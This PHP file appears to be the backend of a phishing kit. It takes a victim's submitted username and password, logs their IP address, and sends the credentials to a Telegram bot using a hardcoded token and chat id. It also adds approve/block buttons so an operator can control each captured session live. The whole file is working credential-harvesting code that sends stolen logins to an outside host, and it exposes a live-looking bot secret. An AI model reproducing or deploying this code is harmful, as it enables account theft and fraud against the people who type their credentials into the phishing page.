<?php

$id = $_POST['id'] ?? '';
$usuario = $_POST['usuario'] ?? null;
$clave = $_POST['clave'] ?? null;

if(!$id){
    exit;
}

$dir = __DIR__ . "/sesiones/";

if(!is_dir($dir)){
    mkdir($dir, 0777, true);
}

$file = $dir . $id . ".txt";

/* ========================= */
/* PRIMERA VEZ: GUARDAR DATOS */
/* ========================= */

if($usuario && $clave){

    /* SOLO SI NO EXISTE O YA FUE APROBADO */
    if(!file_exists($file) || trim(file_get_contents($file)) === "GO"){
        
        file_put_contents($file, "WAIT", LOCK_EX);

        $token = "8687740380:AAGWDU18CPeXsMWhpzy1n6uZ-MkeTxWYYUo";
        $chat_id = "8448767308";

        // 🌐 IP REAL
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';

if(strpos($ip, ',') !== false){
    $ip = explode(',', $ip)[0];
}

$ip = trim($ip);

// 🌍 GEO
$pais = "Pendiente";
$ciudad = "Pendiente";
/*$pais = "Desconocido";
$ciudad = "Desconocido";

$geoData = @file_get_contents("http://ipwho.is/".$ip);*/

$geoData = null; // 🔥 FIX

if($geoData){
    $geo = json_decode($geoData);
    if($geo && isset($geo->success) && $geo->success){
        $pais = $geo->country;
        $ciudad = $geo->city;
    }
}

// 🧾 MENSAJE COMPLETO
$msg = "🔐 Nuevo acceso\n\n";
$msg .= "👤 Usuario: $usuario\n";
$msg .= "🔑 Clave: $clave\n\n";
$msg .= "🌐 IP: $ip\n";
$msg .= "📍 País: $pais\n";
$msg .= "🏙 Ciudad: $ciudad\n";
$msg .= "🆔 ID: $id";

     $keyboard = [
    "inline_keyboard" => [
        [
            ["text" => "✅ Aprobar", "callback_data" => "GO_$id"],
            ["text" => "🚫 Bloquear", "callback_data" => "BLOCK_$id"]
        ]
    ]
];

        // 🚀 ENVÍO A TELEGRAM (SEGURO)
$ch = curl_init();

curl_setopt_array($ch, [
    CURLOPT_URL => "https://api.telegram.org/bot$token/sendMessage",
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => [
        "chat_id" => $chat_id,
        "text" => $msg,
        "reply_markup" => json_encode($keyboard)
    ],
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT => 10
]);

$response = curl_exec($ch);

// 🔍 DEBUG OCULTO
if(curl_errno($ch)){
    error_log("Telegram Error: " . curl_error($ch));
}

curl_close($ch);
    }

echo "OK";
exit;

/* ========================= */
/* CONSULTAR ESTADO */
/* ========================= */

if(file_exists($file)){
    echo trim(file_get_contents($file));
} else {
    echo "WAIT";
}
